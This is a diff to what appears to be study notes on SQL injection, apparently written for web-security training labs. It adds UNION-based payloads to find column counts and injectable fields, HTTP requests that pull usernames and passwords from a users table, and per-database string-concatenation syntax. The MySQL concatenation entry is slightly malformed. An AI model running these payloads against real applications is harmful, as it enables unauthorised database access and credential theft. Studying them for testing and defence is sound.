@@ -93,6 +93,18 @@ Injection
 `xyz' UNION SELECT 'a' WHERE 1=1--`  
 `xyz' UNION SELECT 'a' WHERE 1=2--`
 
+Finding column lenghts
+
+`' UNION SELECT NULL--`  
+`' UNION SELECT NULL,NULL--`  
+`' UNION SELECT NULL,NULL,NULL--`  
+
+or  
+
+`' ORDER BY 1--`  
+`' ORDER BY 2--`  
+`' ORDER BY 3--`  
+
 Finding injectable fields  
 
 `GET /filter?category=Accessories'+UNION+SELECT+NULL,'Injectable',NULL--+ HTTP/1.1`  
@@ -101,6 +113,20 @@ Finding injectable fields
 `' UNION SELECT NULL,NULL,'a',NULL--`  
 `' UNION SELECT NULL,NULL,NULL,'a'--`  
 
+Retreiving Data
+
+`GET /filter?category=Gifts'+UNION+SELECT+username,+password+FROM+users-- HTTP/1.1`
+
+Concat
+
+`GET /filter?category=Pets'+UNION+SELECT+NULL,username+||+'~'+||+password+FROM+users--+ HTTP/1.1`
+
+|Title    | concat method |  
+| --------- | ------------- |
+|Oracle | `'foo' \|\| 'bar'` |  
+|Microsoft | `'foo'+'bar'` |  
+|PostgreSQL | `'foo' \|\| 'bar'` |
+|MySQL | `foo' 'bar'` or `CONCAT('foo','bar')` |  
 
 
 
